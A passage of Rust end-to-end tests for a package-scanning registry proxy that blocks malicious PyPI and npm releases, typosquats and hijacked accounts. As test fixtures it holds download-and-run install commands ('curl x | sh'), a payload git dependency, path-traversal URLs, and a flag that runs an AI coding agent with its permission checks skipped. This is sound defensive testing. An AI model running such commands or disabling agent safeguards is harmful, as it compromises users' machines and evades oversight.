//! End-to-end tests: the real server against a local mock registry, with a stand-in
//! scanner (the real one lives in `customs-scan`) and the untrained dev models.

use std::collections::{BTreeMap, HashMap};
use std::path::PathBuf;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::{Arc, Mutex};
use std::time::Duration;

use axum::extract::{Path, State};
use axum::http::StatusCode;
use axum::response::{IntoResponse, Response};
use axum::routing::get;
use axum::{Json, Router};
use chrono::Utc;
use customs::config::{Mode, Policy, RuleSeverity};
use customs::engine::{Engine, EngineConfig, Limits, ScanFn};
use customs::metrics::Metrics;
use customs::server::ServeOptions;
use customs_model::Models;
use customs_scan::{Ecosystem, Evidence, ScanReport};
use serde_json::{json, Value};
use tokio::net::TcpListener;

// ------------------------------------------------------------------ mock registry

#[derive(Default)]
struct MockState {
    base: String,
    hits: Mutex<HashMap<String, usize>>,
    file_delay_ms: AtomicUsize,
}

impl MockState {
    fn hit(&self, key: &str) {
        *self
            .hits
            .lock()
            .unwrap()
            .entry(key.to_string())
            .or_default() += 1;
    }
    fn hits(&self, key: &str) -> usize {
        self.hits.lock().unwrap().get(key).copied().unwrap_or(0)
    }
}

type Mock = Arc<MockState>;

/// Packages the mock knows: (name, version, archive bytes, upload time).
fn pypi_packages() -> Vec<(&'static str, &'static str, &'static [u8], String)> {
    let old = "2020-01-01T00:00:00.000000Z".to_string();
    let fresh = (Utc::now() - chrono::Duration::hours(2)).to_rfc3339();
    vec![
        ("goodpkg", "1.0.0", b"benign archive", old.clone()),
        ("goodpkg", "1.1.0", b"benign archive v1.1", old.clone()),
        ("evilpkg", "0.0.1", b"EVIL archive", old.clone()),
        ("reqeusts", "2.0.0", b"benign typosquat", old.clone()),
        ("slowpkg", "1.0.0", b"benign slow", old.clone()),
        ("newpkg", "1.0.0", b"benign but new", fresh),
        // The stand-in scanner reports a `setup.py` too large to read.
        ("paddedpkg", "1.0.0", b"benign but padded", old.clone()),
        // The stand-in scanner reports install-time code that runs an AI coding CLI with
        // its permission checks off.
        ("agentic", "1.0.0", b"benign but agentic", old.clone()),
        // A release after five quiet years.
        (
            "revived",
            "1.0.0",
            b"benign revived",
            "2015-01-01T00:00:00.000000Z".into(),
        ),
        // Inside the history rules' 90-day window.
        (
            "revived",
            "1.1.0",
            b"benign revived again",
            (Utc::now() - chrono::Duration::days(10)).to_rfc3339(),
        ),
        // An established project with a release from an hour ago.
        ("rolling", "1.0.0", b"benign rolling", old.clone()),
        (
            "rolling",
            "1.1.0",
            b"benign rolling 1.1.0",
            (Utc::now() - chrono::Duration::hours(1)).to_rfc3339(),
        ),
        // A popular name (in models/dev/popular_pypi.txt) whose archives the dev model
        // flags: a release older than `established.min_age_days`, and one younger.
        (
            "six",
            "1.16.0",
            b"EVIL but established",
            (Utc::now() - chrono::Duration::days(200)).to_rfc3339(),
        ),
        (
            "six",
            "1.17.0",
            b"EVIL and recent",
            (Utc::now() - chrono::Duration::days(10)).to_rfc3339(),
        ),
        // 1.0.0 carries PEP 740 provenance in the JSON simple index, 1.1.0 does not.
        (
            "unsigned",
            "1.0.0",
            b"benign attested",
            (Utc::now() - chrono::Duration::days(100)).to_rfc3339(),
        ),
        (
            "unsigned",
            "1.1.0",
            b"benign unattested",
            (Utc::now() - chrono::Duration::days(10)).to_rfc3339(),
        ),
    ]
}

fn file_name(name: &str, version: &str) -> String {
    format!("{name}-{version}.tar.gz")
}

/// Files of the mock that carry a PEP 740 provenance object.
const ATTESTED: [(&str, &str); 1] = [("unsigned", "1.0.0")];

async fn simple_page(
    State(m): State<Mock>,
    Path(project): Path<String>,
    headers: axum::http::HeaderMap,
) -> Response {
    // Customs asks for exactly the JSON index when it reads provenance; the proxy's
    // pass-through requests (which list several types) keep getting HTML.
    if headers.get("accept").and_then(|a| a.to_str().ok())
        == Some("application/vnd.pypi.simple.v1+json")
    {
        let files: Vec<Value> = pypi_packages()
            .into_iter()
            .filter(|p| p.0 == project)
            .map(|(n, v, _, t)| {
                let prov = ATTESTED
                    .contains(&(n, v))
                    .then(|| format!("{}/integrity/{n}/{v}/provenance", m.base));
                json!({"filename": file_name(n, v), "upload-time": t, "provenance": prov})
            })
            .collect();
        if files.is_empty() {
            return (StatusCode::NOT_FOUND, "Not Found").into_response();
        }
        return (
            [("content-type", "application/vnd.pypi.simple.v1+json")],
            json!({"meta": {"api-version": "1.1"}, "name": project, "files": files}).to_string(),
        )
            .into_response();
    }
    let links: Vec<String> = pypi_packages()
        .into_iter()
        .filter(|p| p.0 == project)
        .map(|(n, v, _, _)| {
            let f = file_name(n, v);
            format!(
                r#"<a href="{}/files/packages/ab/cd/{f}#sha256=00">{f}</a><br/>"#,
                m.base
            )
        })
        .collect();
    if links.is_empty() {
        return (StatusCode::NOT_FOUND, "Not Found").into_response();
    }
    (
        [("content-type", "text/html")],
        format!("<html><body>{}</body></html>", links.join("\n")),
    )
        .into_response()
}

fn pypi_file_json(m: &MockState, n: &str, v: &str, t: &str, bytes: &[u8]) -> Value {
    json!({
        "filename": file_name(n, v),
        "url": format!("{}/files/packages/ab/cd/{}", m.base, file_name(n, v)),
        "upload_time_iso_8601": t,
        "packagetype": "sdist",
        "size": bytes.len(),
        "digests": {"sha256": "00"},
        "yanked": false,
    })
}

async fn pypi_json(State(m): State<Mock>, Path(name): Path<String>) -> Response {
    let pkgs: Vec<_> = pypi_packages()
        .into_iter()
        .filter(|p| p.0 == name)
        .collect();
    if pkgs.is_empty() {
        return (StatusCode::NOT_FOUND, Json(json!({"message": "Not Found"}))).into_response();
    }
    let mut releases = serde_json::Map::new();
    for (n, v, b, t) in &pkgs {
        releases.insert(v.to_string(), json!([pypi_file_json(&m, n, v, t, b)]));
    }
    let latest = pkgs.last().unwrap().1;
    Json(json!({"info": {"name": name, "version": latest}, "releases": releases})).into_response()
}

async fn pypi_version_json(
    State(m): State<Mock>,
    Path((name, version)): Path<(String, String)>,
) -> Response {
    match pypi_packages()
        .into_iter()
        .find(|p| p.0 == name && p.1 == version)
    {
        Some((n, v, b, t)) => Json(
            json!({"info": {"name": n, "version": v}, "urls": [pypi_file_json(&m, n, v, &t, b)]}),
        )
        .into_response(),
        None => (StatusCode::NOT_FOUND, "{}").into_response(),
    }
}

async fn files(State(m): State<Mock>, Path(path): Path<String>) -> Response {
    m.hit(&path);
    let delay = m.file_delay_ms.load(Ordering::SeqCst);
    if delay > 0 {
        tokio::time::sleep(Duration::from_millis(delay as u64)).await;
    }
    let file = path.rsplit('/').next().unwrap_or("");
    for (n, v, b, _) in pypi_packages() {
        if file_name(n, v) == file {
            return b.to_vec().into_response();
        }
    }
    StatusCode::NOT_FOUND.into_response()
}

/// npm packages: (name, version, bytes, published, extra version document fields).
fn npm_packages() -> Vec<(&'static str, &'static str, &'static [u8], String, Value)> {
    let old = "2019-05-01T00:00:00.000Z".to_string();
    let fresh = (Utc::now() - chrono::Duration::hours(1)).to_rfc3339();
    // Inside the history rules' 90-day window.
    let recent = chrono::DateTime::from_timestamp(Utc::now().timestamp() - 10 * 86_400, 0).unwrap();
    let attested = json!({"attestations": {"url": "https://r/attestations/x", "provenance": {}}});
    vec![
        (
            "@scope/lib",
            "1.2.3",
            b"benign scoped",
            old.clone(),
            json!({}),
        ),
        (
            "plainlib",
            "0.1.0",
            b"benign plain",
            old.clone(),
            json!({"scripts": {"test": "jest"}}),
        ),
        (
            "freshpkg",
            "1.0.0",
            b"benign fresh",
            fresh,
            json!({"scripts": {"postinstall": "node setup.js"}}),
        ),
        (
            "evil-js",
            "6.6.6",
            b"EVIL js",
            old.clone(),
            json!({"scripts": {"preinstall": "curl x | sh"}}),
        ),
        // An established package with a release from an hour ago.
        (
            "rolling-js",
            "1.0.0",
            b"benign rolling-js",
            old.clone(),
            json!({}),
        ),
        (
            "rolling-js",
            "1.1.0",
            b"benign rolling-js 1.1.0",
            (Utc::now() - chrono::Duration::hours(1)).to_rfc3339(),
            json!({}),
        ),
        // An established package whose latest release looks like an account takeover.
        (
            "hijacked",
            "1.0.0",
            b"benign hijacked",
            old,
            json!({"_npmUser": {"name": "maintainer"}, "dist": attested}),
        ),
        (
            "hijacked",
            "1.1.0",
            b"benign hijacked 1.1.0",
            "2019-06-01T00:00:00.000Z".into(),
            json!({"_npmUser": {"name": "maintainer"}, "dist": attested}),
        ),
        (
            "hijacked",
            "1.1.1",
            b"benign hijacked 1.1.1",
            (Utc::now() - chrono::Duration::days(10)).to_rfc3339(),
            json!({"_npmUser": {"name": "attacker"}, "scripts": {"postinstall": "node bundle.js"}}),
        ),
        // A takeover that hides its payload in dependencies: a brand-new package from a
        // stranger and a git dependency npm would fetch without asking the registry.
        (
            "depjack",
            "2.0.0",
            b"benign depjack",
            "2023-12-01T00:00:00.000Z".into(),
            json!({"_npmUser": {"name": "maintainer"}, "dependencies": {"plainlib": "^0.1.0"}}),
        ),
        (
            "depjack",
            "2.0.1",
            b"benign depjack 2.0.1",
            recent.to_rfc3339(),
            json!({"_npmUser": {"name": "maintainer"}, "dependencies":
                {"plainlib": "^0.1.0", "lure-dep": "^0.0.1"},
                "optionalDependencies": {"@depjack/setup": "github:evil/payload#abc"}}),
        ),
        (
            "lure-dep",
            "0.0.1",
            b"benign lure",
            (recent - chrono::Duration::days(1)).to_rfc3339(),
            json!({"_npmUser": {"name": "stranger"}}),
        ),
        // Real tarballs, for `customs diff`: the second release adds a dependency, an
        // install script and the file it runs.
        (
            "diffpkg",
            "1.0.0",
            &diffpkg_tarballs().0,
            "2023-01-01T00:00:00.000Z".into(),
            json!({"_npmUser": {"name": "maintainer"}, "dependencies": {"plainlib": "^0.1.0"}}),
        ),
        (
            "diffpkg",
            "1.0.1",
            &diffpkg_tarballs().1,
            "2024-01-01T00:00:00.000Z".into(),
            json!({"_npmUser": {"name": "maintainer"},
                "dependencies": {"plainlib": "^0.1.0", "lure-dep": "^0.0.1"},
                "scripts": {"postinstall": "node setup.js"}}),
        ),
    ]
}

fn diffpkg_tarballs() -> &'static (Vec<u8>, Vec<u8>) {
    static T: std::sync::OnceLock<(Vec<u8>, Vec<u8>)> = std::sync::OnceLock::new();
    T.get_or_init(|| {
        (
            npm_tgz(&[
                ("package/package.json", r#"{"name": "diffpkg", "version": "1.0.0"}"#),
                ("package/index.js", "const a = 1;\nmodule.exports = a;\n"),
                ("package/README.md", "docs\n"),
                ("package/old.js", "legacy();\n"),
            ]),
            npm_tgz(&[
                (
                    "package/package.json",
                    r#"{"name": "diffpkg", "version": "1.0.1", "scripts": {"postinstall": "node setup.js"}}"#,
                ),
                ("package/index.js", "const a = 2;\nmodule.exports = a;\n"),
                ("package/README.md", "docs\n"),
                ("package/setup.js", "// EVIL\nfetchAndRun();\n"),
            ]),
        )
    })
}

/// Echoes the query, so a test can see what reached the registry.
async fn npm_search(uri: axum::http::Uri) -> Response {
    Json(json!({"objects": [], "query": uri.query()})).into_response()
}

async fn npm_doc(State(m): State<Mock>, Path(rest): Path<String>) -> Response {
    if let Some((name, file)) = rest.split_once("/-/") {
        m.hit(&format!("npm:{file}"));
        for (n, v, b, _, _) in npm_packages() {
            let bare = n.rsplit('/').next().unwrap();
            if n == name && file == format!("{bare}-{v}.tgz") {
                return b.to_vec().into_response();
            }
        }
        return StatusCode::NOT_FOUND.into_response();
    }
    let name = rest.replace("%2f", "/").replace("%2F", "/");
    let rows: Vec<_> = npm_packages().into_iter().filter(|p| p.0 == name).collect();
    if rows.is_empty() {
        return (StatusCode::NOT_FOUND, Json(json!({"error": "Not found"}))).into_response();
    }
    let mut time = serde_json::Map::new();
    let mut versions = serde_json::Map::new();
    for (n, v, _, t, extra) in &rows {
        let bare = n.rsplit('/').next().unwrap();
        let mut doc = extra.clone();
        doc["name"] = json!(n);
        doc["version"] = json!(v);
        if doc.get("dist").is_none() {
            doc["dist"] = json!({});
        }
        doc["dist"]["tarball"] = json!(format!("{}/npm/{n}/-/{bare}-{v}.tgz", m.base));
        doc["dist"]["shasum"] = json!("x");
        time.insert(v.to_string(), json!(t));
        versions.insert(v.to_string(), doc);
    }
    time.insert("created".into(), json!(rows[0].3));
    Json(json!({
        "name": name,
        "dist-tags": {"latest": rows.last().unwrap().1},
        "time": time,
        "versions": versions,
    }))
    .into_response()
}

async fn start_mock() -> Mock {
    let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
    let base = format!("http://{}", listener.local_addr().unwrap());
    let state = Arc::new(MockState {
        base,
        ..Default::default()
    });
    let app = Router::new()
        .route("/simple/{project}/", get(simple_page))
        .route("/pypi/{name}/json", get(pypi_json))
        .route("/pypi/{name}/{version}/json", get(pypi_version_json))
        .route("/files/{*path}", get(files))
        .route("/npm/-/v1/search", get(npm_search))
        .route("/npm/{*rest}", get(npm_doc))
        .with_state(state.clone());
    tokio::spawn(async move { axum::serve(listener, app).await.unwrap() });
    state
}

// ------------------------------------------------------------------ harness

/// Stand-in scanner: archives containing `EVIL` light up the install-time indicators the
/// dev tree model keys on; everything else gets benign zero features.
fn fake_scanner(calls: Arc<AtomicUsize>) -> ScanFn {
    Arc::new(move |bytes: &[u8], filename: &str, eco: Ecosystem| {
        calls.fetch_add(1, Ordering::SeqCst);
        let mut plain = Vec::new();
        let bytes = if bytes.starts_with(&[0x1f, 0x8b]) {
            use std::io::Read;
            flate2::read::GzDecoder::new(bytes)
                .read_to_end(&mut plain)
                .unwrap();
            &plain[..]
        } else {
            bytes
        };
        let evil = bytes.windows(4).any(|w| w == b"EVIL");
        let mut features = BTreeMap::new();
        for f in [
            "inst_download_exec",
            "inst_exfil_endpoint",
            "inst_proc_exec",
            "inst_network",
        ] {
            features.insert(f.to_string(), if evil { 2.0 } else { 0.0 });
        }
        let mut install_surface = vec!["setup.py".to_string()];
        if bytes.ends_with(b"fresh") {
            install_surface.push("package.json:scripts.postinstall".into());
        }
        Ok(ScanReport {
            schema_version: 1,
            ecosystem: eco,
            archive: filename.to_string(),
            sha256: String::new(),
            name: None,
            version: None,
            features,
            evidence: if evil {
                vec![Evidence {
                    indicator: "download_exec".into(),
                    file: "setup.py".into(),
                    line: 3,
                    snippet: "os.system('curl http://x | sh')".into(),
                }]
            } else {
                vec![]
            },
            install_surface,
            tokens: None,
            errors: vec![],
            unread_code: if bytes.ends_with(b"padded") {
                vec!["setup.py".into()]
            } else {
                vec![]
            },
            startup_hooks: vec![],
            agent_bypass: if bytes.ends_with(b"agentic") {
                vec!["telemetry.js:4: --dangerously-skip-permissions".into()]
            } else {
                vec![]
            },
        })
    })
}

fn dev_models() -> Models {
    let dir = PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("../../models/dev");
    Models::load(dir).unwrap()
}

struct Harness {
    base: String,
    mock: Mock,
    engine: Arc<Engine>,
    scans: Arc<AtomicUsize>,
    http: reqwest::Client,
    shutdown: Option<tokio::sync::oneshot::Sender<()>>,
    server: Option<tokio::task::JoinHandle<anyhow::Result<()>>>,
    _dir: tempfile::TempDir,
}

impl Harness {
    async fn start(edit: impl FnOnce(&mut Policy)) -> Self {
        Self::start_with_ui(edit, None).await
    }

    async fn start_with_ui(edit: impl FnOnce(&mut Policy), ui: Option<PathBuf>) -> Self {
        Self::start_full(edit, ui, Limits::default()).await
    }

    async fn start_full(
        edit: impl FnOnce(&mut Policy),
        ui: Option<PathBuf>,
        limits: Limits,
    ) -> Self {
        Self::start_serving(edit, ui, limits, "127.0.0.1:0", ServeOptions::default()).await
    }

    async fn start_serving(
        edit: impl FnOnce(&mut Policy),
        ui: Option<PathBuf>,
        limits: Limits,
        bind: &str,
        opts: ServeOptions,
    ) -> Self {
        let mock = start_mock().await;
        let dir = tempfile::tempdir().unwrap();
        let mut policy = Policy::default();
        policy.upstream.pypi_simple = format!("{}/simple", mock.base);
        policy.upstream.pypi_files = format!("{}/files", mock.base);
        policy.upstream.pypi_json = format!("{}/pypi", mock.base);
        policy.upstream.npm = format!("{}/npm", mock.base);
        edit(&mut policy);
        let scans = Arc::new(AtomicUsize::new(0));
        let engine = Engine::new(EngineConfig {
            data_dir: dir.path().to_path_buf(),
            models: dev_models(),
            policy,
            policy_path: dir.path().join("policy.toml"),
            scanner: fake_scanner(scans.clone()),
            limits,
            metrics: Arc::new(Metrics::new()),
        })
        .unwrap();
        let listener = TcpListener::bind(bind).await.unwrap();
        let base = format!("http://127.0.0.1:{}", listener.local_addr().unwrap().port());
        let (tx, rx) = tokio::sync::oneshot::channel::<()>();
        let server = tokio::spawn(customs::server::serve_with(
            listener,
            engine.clone(),
            ui,
            opts,
            async move {
                let _ = rx.await;
            },
        ));
        Self {
            base,
            mock,
            engine,
            scans,
            http: reqwest::Client::builder().no_proxy().build().unwrap(),
            shutdown: Some(tx),
            server: Some(server),
            _dir: dir,
        }
    }

    async fn get(&self, path: &str) -> reqwest::Response {
        self.http
            .get(format!("{}{path}", self.base))
            .send()
            .await
            .unwrap()
    }

    async fn check(&self, eco: &str, name: &str, version: Option<&str>) -> (u16, Value) {
        let r = self
            .http
            .post(format!("{}/api/check", self.base))
            .json(&json!({"ecosystem": eco, "name": name, "version": version, "client": "test"}))
            .send()
            .await
            .unwrap();
        (r.status().as_u16(), r.json().await.unwrap())
    }

    async fn events(&self) -> Vec<Value> {
        self.get("/api/events").await.json().await.unwrap()
    }

    async fn stop(mut self) {
        let _ = self.shutdown.take().unwrap().send(());
        tokio::time::timeout(Duration::from_secs(10), self.server.take().unwrap())
            .await
            .expect("graceful shutdown timed out")
            .unwrap()
            .unwrap();
    }
}

fn pypi_file_path(name: &str, version: &str) -> String {
    format!("/pypi/files/packages/ab/cd/{}", file_name(name, version))
}

// ------------------------------------------------------------------ tests

#[tokio::test(flavor = "multi_thread")]
async fn pypi_simple_page_is_rewritten_and_allowed_file_streams() {
    let h = Harness::start(|_| {}).await;
    let page = h.get("/pypi/simple/GoodPkg/").await;
    assert_eq!(page.status(), 200);
    let html = page.text().await.unwrap();
    assert!(
        html.contains(&format!(
            "{}/pypi/files/packages/ab/cd/goodpkg-1.0.0.tar.gz#sha256=00",
            h.base
        )),
        "{html}"
    );
    assert!(!html.contains(&h.mock.base));

    let r = h.get(&pypi_file_path("goodpkg", "1.0.0")).await;
    assert_eq!(r.status(), 200);
    assert_eq!(r.headers()["x-customs-decision"], "allow");
    assert_eq!(r.bytes().await.unwrap().as_ref(), b"benign archive");

    let ev = h.events().await;
    assert_eq!(ev.len(), 1);
    assert_eq!(ev[0]["kind"], "install");
    assert_eq!(ev[0]["decision"], "allow");
    assert_eq!(ev[0]["name"], "goodpkg");
    assert_eq!(ev[0]["version"], "1.0.0");
    let v: Value = h
        .get(&format!("/api/verdicts/{}", ev[0]["verdict_id"]))
        .await
        .json()
        .await
        .unwrap();
    assert_eq!(v["id"], ev[0]["verdict_id"]);
    assert_eq!(v["artifact"], "goodpkg-1.0.0.tar.gz");
    assert_eq!(v["model_version"], "dev-untrained");
    assert!(v["scores"]["code_gbdt"].as_f64().unwrap() < 0.5);
    assert_eq!(v["thresholds"]["block"], 0.9);
    assert_eq!(v["cached"], false);

    // Second download: served from cache, scan not repeated.
    let r = h.get(&pypi_file_path("goodpkg", "1.0.0")).await;
    assert_eq!(r.status(), 200);
    assert_eq!(h.mock.hits("packages/ab/cd/goodpkg-1.0.0.tar.gz"), 1);
    assert_eq!(h.scans.load(Ordering::SeqCst), 1);
    let ev = h.events().await;
    let v: Value = h
        .get(&format!("/api/verdicts/{}", ev[0]["verdict_id"]))
        .await
        .json()
        .await
        .unwrap();
    assert_eq!(v["cached"], true);
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn pypi_malicious_file_is_blocked_with_explanation() {
    let h = Harness::start(|_| {}).await;
    let r = h.get(&pypi_file_path("evilpkg", "0.0.1")).await;
    assert_eq!(r.status(), 403);
    let reason = r.status().canonical_reason();
    assert_eq!(reason, Some("Forbidden"));
    assert_eq!(r.headers()["x-customs-decision"], "block");
    let body = r.text().await.unwrap();
    assert!(
        body.starts_with("Customs blocked pypi package evilpkg 0.0.1"),
        "{body}"
    );
    assert!(
        body.contains("Downloads and executes a payload at install time"),
        "{body}"
    );
    assert!(body.contains("/api/verdicts/"), "{body}");

    let ev = h.events().await;
    assert_eq!(ev[0]["decision"], "block");
    let v: Value = h
        .get(&format!("/api/verdicts/{}", ev[0]["verdict_id"]))
        .await
        .json()
        .await
        .unwrap();
    assert_eq!(v["model_decision"], "block");
    assert_eq!(v["reasons"][0]["feature"], "inst_download_exec");
    assert_eq!(v["evidence"][0]["file"], "setup.py");
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn code_too_large_to_scan_is_blocked() {
    let h = Harness::start(|_| {}).await;
    let r = h.get(&pypi_file_path("paddedpkg", "1.0.0")).await;
    assert_eq!(r.status(), 403);
    assert_eq!(r.headers()["x-customs-decision"], "block");
    let body = r.text().await.unwrap();
    assert!(body.contains("setup.py could not be read"), "{body}");
    let (_, v) = h.check("pypi", "paddedpkg", None).await;
    assert_eq!(v["decision"], "block");
    assert_eq!(v["model_decision"], "allow");
    assert_eq!(v["policy_hits"][0]["rule"], "unread_code");
    h.stop().await;

    let h = Harness::start(|p| p.unread_code = RuleSeverity::Off).await;
    let r = h.get(&pypi_file_path("paddedpkg", "1.0.0")).await;
    assert_eq!(r.status(), 200);
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn install_time_agent_with_checks_off_is_blocked() {
    let h = Harness::start(|_| {}).await;
    let r = h.get(&pypi_file_path("agentic", "1.0.0")).await;
    assert_eq!(r.status(), 403);
    let body = r.text().await.unwrap();
    assert!(
        body.contains("runs an AI coding agent with its permission checks off"),
        "{body}"
    );
    let (_, v) = h.check("pypi", "agentic", None).await;
    assert_eq!(v["decision"], "block");
    assert_eq!(v["model_decision"], "allow");
    assert_eq!(v["policy_hits"][0]["rule"], "agent_bypass");
    h.stop().await;

    let h = Harness::start(|p| p.agent_bypass = RuleSeverity::Warn).await;
    let r = h.get(&pypi_file_path("agentic", "1.0.0")).await;
    assert_eq!(r.status(), 200);
    assert_eq!(r.headers()["x-customs-decision"], "warn");
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn raw_reason_phrase_names_the_rule() {
    let h = Harness::start(|p| p.deny = vec!["pypi:goodpkg".into()]).await;
    let path = pypi_file_path("goodpkg", "1.0.0");
    let mut s = tokio::net::TcpStream::connect(h.base.trim_start_matches("http://"))
        .await
        .unwrap();
    use tokio::io::{AsyncReadExt, AsyncWriteExt};
    s.write_all(
        format!("GET {path} HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n").as_bytes(),
    )
    .await
    .unwrap();
    let mut buf = Vec::new();
    s.read_to_end(&mut buf).await.unwrap();
    let text = String::from_utf8_lossy(&buf);
    let status_line = text.lines().next().unwrap();
    assert_eq!(
        status_line,
        "HTTP/1.1 403 Blocked by Customs: deny: pypi:goodpkg is on the deny list"
    );
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn typosquat_name_is_warned_but_served() {
    let h = Harness::start(|_| {}).await;
    let r = h.get(&pypi_file_path("reqeusts", "2.0.0")).await;
    assert_eq!(r.status(), 200);
    assert_eq!(r.headers()["x-customs-decision"], "warn");
    let (status, v) = h.check("pypi", "reqeusts", None).await;
    assert_eq!(status, 200);
    assert_eq!(v["decision"], "warn");
    let labels: Vec<&str> = v["reasons"]
        .as_array()
        .unwrap()
        .iter()
        .map(|r| r["label"].as_str().unwrap())
        .collect();
    assert!(
        labels.contains(&"1 edit from popular package 'requests'"),
        "{labels:?}"
    );
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn new_versions_hit_min_age() {
    let h = Harness::start(|_| {}).await;
    let r = h.get(&pypi_file_path("newpkg", "1.0.0")).await;
    assert_eq!(r.status(), 403);
    let body = r.text().await.unwrap();
    assert!(
        body.contains("min_age_days: published 2 hours ago (policy: 3 days)"),
        "{body}"
    );
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn established_releases_of_popular_packages_skip_the_model() {
    let h = Harness::start(|_| {}).await;
    // Through the proxy: the model blocks, the established prior serves it.
    let r = h.get(&pypi_file_path("six", "1.16.0")).await;
    assert_eq!(r.status(), 200);
    assert_eq!(r.headers()["x-customs-decision"], "allow");
    let (status, v) = h.check("pypi", "six", Some("1.16.0")).await;
    assert_eq!(status, 200);
    assert_eq!(v["decision"], "allow");
    // The dev model warns on the archive (its name model lowers the risk of a popular
    // name); the trained one blocks requests 2.32.3. Either is set aside.
    let model = v["model_decision"].clone();
    assert_ne!(model, "allow", "{v}");
    assert!(v["risk"].as_f64().unwrap() >= v["thresholds"]["warn"].as_f64().unwrap());
    let hit = v["policy_hits"]
        .as_array()
        .unwrap()
        .iter()
        .find(|h| h["rule"] == "established")
        .unwrap_or_else(|| panic!("{v}"));
    assert_eq!(hit["severity"], "allow");
    let detail = hit["detail"].as_str().unwrap();
    assert!(
        detail.starts_with("top-5000 PyPI package (#")
            && detail.ends_with("(200 days ago; policy: 30 days)"),
        "{detail}"
    );
    // A popular name with a release younger than 30 days gets the model's verdict.
    let r = h.get(&pypi_file_path("six", "1.17.0")).await;
    assert_ne!(r.headers()["x-customs-decision"], "allow");
    let (_, v) = h.check("pypi", "six", Some("1.17.0")).await;
    assert_ne!(v["decision"], "allow", "{v}");
    assert_eq!(v["decision"], v["model_decision"]);
    assert!(rules_of(&v).iter().all(|r| r != "established"), "{v}");
    // An unpopular name at any age gets the model's verdict.
    let (_, v) = h.check("pypi", "evilpkg", None).await;
    assert_eq!(v["decision"], "block");
    assert!(rules_of(&v).iter().all(|r| r != "established"), "{v}");
    h.stop().await;

    // The deny list still wins.
    let h = Harness::start(|p| p.deny = vec!["pypi:six".into()]).await;
    let r = h.get(&pypi_file_path("six", "1.16.0")).await;
    assert_eq!(r.status(), 403);
    let (_, v) = h.check("pypi", "six", Some("1.16.0")).await;
    assert_eq!(v["decision"], "block");
    assert_eq!(rules_of(&v), vec!["deny"]);
    h.stop().await;

    // Switched off, the model decides.
    let h = Harness::start(|p| p.established.enabled = false).await;
    let r = h.get(&pypi_file_path("six", "1.16.0")).await;
    assert_eq!(r.headers()["x-customs-decision"], model.as_str().unwrap());
    let (_, v) = h.check("pypi", "six", Some("1.16.0")).await;
    assert_eq!(v["decision"], model);
    assert!(rules_of(&v).is_empty(), "{v}");
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn archives_over_the_scan_limit_with_install_code_are_blocked() {
    let limits = Limits {
        max_scan_bytes: 4,
        ..Limits::default()
    };
    let h = Harness::start_full(|_| {}, None, limits).await;
    // An sdist runs its build at install; the mock's bytes are not even an archive.
    let r = h.get(&pypi_file_path("goodpkg", "1.0.0")).await;
    assert_eq!(r.status(), 403);
    let body = r.text().await.unwrap();
    assert!(body.contains("unread_code"), "{body}");
    assert!(body.contains("above the 0 MB scan limit"), "{body}");
    // A tarball whose layout cannot be read fails closed the same way.
    let r = h.get("/npm/plainlib/-/plainlib-0.1.0.tgz").await;
    assert_eq!(r.status(), 403);
    // The scanner never ran on either.
    assert_eq!(h.scans.load(Ordering::SeqCst), 0);
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn upstream_urls_cannot_be_redirected_by_escaped_paths() {
    let h = Harness::start(|_| {}).await;
    // The name Customs would scan and the URL it would fetch must agree: a fragment,
    // query, backslash or leftover escape could make them differ.
    for path in [
        "/pypi/files/packages/ab/cd/evil-1.0.tar.gz%23/goodpkg-1.0.0.tar.gz",
        "/pypi/files/packages/ab/cd/evil-1.0-py3-none-any.whl%23.metadata",
        "/pypi/files/packages/ab/cd/evil-1.0.tar.gz%3F/goodpkg-1.0.0.tar.gz",
        "/pypi/files/packages/%252e%252e/cd/goodpkg-1.0.0.tar.gz",
        "/pypi/files/packages/ab%5C..%5Ccd/goodpkg-1.0.0.tar.gz",
        "/pypi/simple/good%23pkg/",
    ] {
        assert_eq!(h.get(path).await.status(), 400, "{path}");
    }
    for path in [
        "/npm/-/%252e%252e/evil",
        "/npm/evil/-/evil-1.0.0.tgz%23/plainlib-0.1.0.tgz",
        "/npm/plainlib/-/..%5Cplainlib-0.1.0.tgz",
    ] {
        assert_eq!(h.get(path).await.status(), 404, "{path}");
    }
    assert_eq!(h.mock.hits("packages/ab/cd/goodpkg-1.0.0.tar.gz"), 0);
    h.stop().await;
}

#[tokio::test(flavor = "multi_thread")]
async fn npm_packument_rewrite_and_tarballs() {
    let h = Harness::start(|_| {}).await;
    // Registry service endpoints pass through with their query (`npm search`).
    let r: Value = h
        .get("/npm/-/v1/search?text=left-pad&size=20")
        .await
        .json()
        .await
        .unwrap();
    assert_eq!(r["query"], "text=left-pad&size=20");
    for path in ["/npm/@scope%2flib", "/npm/@scope/lib", "/npm/@scope%2Flib"] {
        let r = h.get(path).await;
        assert_eq!(r.status(), 200, "{path}");
        let v: Value = r.json().await.unwrap();
        assert_eq!(
            v["versions"]["1.2.3"]["dist"]["tarball"],
            format!("{}/npm/@scope/lib/-/lib-1.2.3.tgz", h.base),
            "{path}"
        );
    }
    let r = h.get("/npm/@scope/lib/-/lib-1.2.3.tgz").await;
    assert_eq!(r.status(), 200);
    assert_eq!(r.bytes().await.unwrap().as_ref(), b"benign scoped");
    let r = h.get("/npm/plainlib/-/plainlib-0.1.0.tgz").await;
    assert_eq!(r.status(), 200);

    let r = h.get("/npm/evil-js/-/evil-js-6.6.6.tgz").await;
    assert_eq!(r.status(), 403);
    let err: Value = r.json().await.unwrap();
    assert!(err["error"]
        .as_str()
        .unwrap()
        .contains("Customs blocked npm package evil-js 6.6.6"));

    // Young package with a postinstall script: blocked by both age rules.
    let r = h.get("/npm/freshpkg/-/freshpkg-1.0.0.tgz").await;
    assert_eq!(r.status(), 403);
    let err: Value = r.json().await.unwrap();
    let msg = err["error"].as_str().unwrap();
